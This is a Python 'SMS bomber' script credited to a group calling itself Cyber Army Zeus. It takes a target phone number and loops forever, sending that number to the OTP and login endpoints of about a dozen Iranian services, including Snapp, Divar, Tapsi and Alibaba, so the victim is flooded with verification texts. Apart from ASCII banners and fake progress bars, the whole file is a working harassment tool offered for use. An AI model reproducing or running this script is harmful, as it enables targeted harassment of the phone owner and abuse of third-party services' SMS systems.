#script by team cyber army zeus

import cowsay
from cgi import print_directory
from requests import post , get
import os
from colorama import Fore
import pyfiglet
from pyfiglet import Figlet
from os import system
import pyfiglet
from tqdm import tqdm
import time
from time import sleep

#instagram we : hacking.in_war_dark and telegram we : CyBeR ArMy ZeUs

noqteh = " CyBeR ArMy ZeUs ".center(0,"_")
CL34r = "clear"
os.system(CL34r)
print(Fore.CYAN+noqteh)
def banner():

        ToiLe = "toilet -f mono12 SMS ZEUS"
        system(ToiLe)
banner()

print("""
  .;'                     `;,
 .;'  ,;'    ,,,,,     `;,  `;,   SMS BOMBER BY CyBeR ArMy ZeUs
.;'  ,;'  ,;' ,,, `;,  `;,  `;,   Instagram We : hacking.in_war.dark
::   ::   :   (o)   :   ::   ::   telegram : t.me/CyBeR_ArMy_ZeUs
':.  ':.  ':. /_\ ,:'  ,:'  ,:'   SMS BOMBER v1.0
 ':.  ':.    /___\    ,:'  ,:'    im not exist ...
  ':.       /_____\      ,:'
           [IIIIIII]

""")
print (Fore.YELLOW+" \t\tScript by team Black Wolves \n \t\t Telegram We : https://t.me/Wolves_Cyber_army")
print(noqteh)

#starting sms attacking...
print("")
number = input(Fore.BLUE+' Enter Number Target :~> +98  : ')
print(Fore.CYAN+"")

print(noqteh)
for i in range(3):
        print(""),time.sleep(0.5)

print(Fore.GREEN+" [+] Loading ... ")
sleep(0.5)
print(" [+] Starting SMS BoMbEr ")
sleep(0.5)
print(" [+] Doing ...")
sleep(0.5)
print("")
sleep(0.5)
print(noqteh)
print("")
for i in range(3):
        for char in tqdm(range(100),colour = "CYAN"):
                time.sleep(4/400)
print(Fore.GREEN+"")
print(noqteh)
for i in range(2):
     print(""),time.sleep(1)

# We Don't Forget , We Don't Forgive , We CyBeR ArMy ZeUs

snapj = {"phone":number}
tapsi1 = {"credential":{"phoneNumber":number,"role":"PASSENGER"}}
divarj = {"phone":number}
emd = "send=1&cellphone="+number
rubj = {"api_version":"3","method":"sendCode","data":{"phone_number":number,"send_type":"SMS"}}
bamad = "cellNumber="+number
ali = {"phoneNumber": number }
hamrah = {"action":"getAppViaSMS","number": number }
arkd = {"mobile":number,"country_code":"IR","provider_code":"RUBIKA"}

while True:

    r3 = post("https://api.tapsi.cab/api/v2/user",json=tapsi1)
    if r3.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)


    r4 = post("https://api.divar.ir/v5/auth/authenticate",json=divarj)
    if r4.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)


    r5 = post("https://messengerg2c42.iranlms.ir/",json=rubj)
    if r5.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)


    r6 = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",json=snapj)
    if r6.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)


    r7 = post("https://web.emtiyaz.app/json/login",data=emd)
    if r7.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)


    r8 = post("https://bama.ir/signin-checkforcellnumber",data=bamad)
    if r8.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)


    r9 = post("https://ws.alibaba.ir/api/v3/account/mobile/otp",json=ali)
    if r9.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)


    r11 = post("https://api.chartex.net/api/v2/user/validate",json=arkd)
    if r11.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)


    r12 = get("https://api.torob.com/a/phone/send-pin/?phone_number="+number)
    if r12.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)


    r13 = get("https://api.binjo.ir/api/panel/get_code/"+number)
    if r13.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)


    r14 = get("https://core.gap.im/v1/user/add.json?mobile="+number)
    if r14.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)


    r15 = post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{number}')
    if r15.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)
